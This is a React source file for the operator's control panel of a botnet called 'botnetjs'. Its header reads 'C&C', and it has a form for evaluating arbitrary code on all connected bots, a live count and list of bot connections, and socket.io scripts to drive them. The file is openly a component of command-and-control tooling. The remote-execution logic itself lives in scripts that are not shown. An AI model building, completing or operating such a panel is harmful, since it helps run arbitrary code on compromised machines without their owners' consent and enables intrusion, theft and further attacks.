var React = require('react')
var DefaultLayout = require('./layouts/default')

var ControlPanel = React.createClass({
    render: function () {
        return (
                <DefaultLayout title={this.props.title}>
                    <div>This is the control panel.</div>
                    <header>botnetjs C&amp;C</header>
                    <div className="controls">
                        <form onSubmit="evalAllBots()">
                        <label>Eval code on all bots</label>
                        <textarea name="evalme" />
                        <input type="submit" value="Submit" />
                        </form>
                    </div>
                    <div className="connections_wrapper">
                        <div className="connections_box">
                            <div id="connections_count">{this.state.connectionCount}</div> connections
                        </div>
                        <div id="connections_list"></div>
                    </div>
                    <script src="/socket.io/socket.io.js"></script>
                    <script src="/botnetjs/control.js"></script>
                </DefaultLayout>
               )
    }
})

module.exports = ControlPanel
